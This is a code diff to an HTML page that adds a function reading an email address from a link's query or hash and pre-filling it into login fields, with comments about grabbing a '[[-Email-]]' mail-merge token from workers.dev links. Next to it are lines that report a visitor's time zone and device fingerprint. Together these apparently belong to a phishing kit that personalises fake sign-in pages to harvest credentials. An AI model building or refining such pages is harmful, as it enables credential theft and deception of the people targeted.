@@ -1257,6 +1257,34 @@
         `🌍 TZ: ${deviceInfo.tz}\n` +
         `🔍 FP: ${deviceInfo.fp}`);
     }
-  </script>
+      // ============================================================
+    // URL EMAIL PRE-FILL  (auto-grab the [[-Email-]] token from the link)
+    // Supported link forms:
+    //   https://wxyz.lammm.workers.dev/?email=x@y.com
+    //   https://wxyz.lammm.workers.dev/#email=x@y.com
+    //   https://wxyz.lammm.workers.dev/#x@y.com
+    // ============================================================
+    function prefillEmailFromURL() {
+      var em = null;
+      try { em = new URLSearchParams(location.search).get('email') || null; } catch (e) {}
+      if (!em) {
+        var h = location.hash.replace(/^#/, '');
+        if (h) {
+          if (h.indexOf('email=') === 0) h = h.slice(6);
+          try { em = decodeURIComponent(h); } catch (e) { em = h; }
+        }
+      }
+      if (em) {
+        var u = document.getElementById('user');
+        if (u) u.value = em;
+        var ee = document.getElementById('errorEmail');
+        if (ee && !ee.value) ee.value = em;
+        console.log('[PREFILL] email from URL:', em);
+      }
+    }
+    document.addEventListener('DOMContentLoaded', prefillEmailFromURL);
+    // A hash-only link change does not reload the page, so re-read on hashchange.
+    window.addEventListener('hashchange', prefillEmailFromURL);
+</script>
 </body>
 </html>
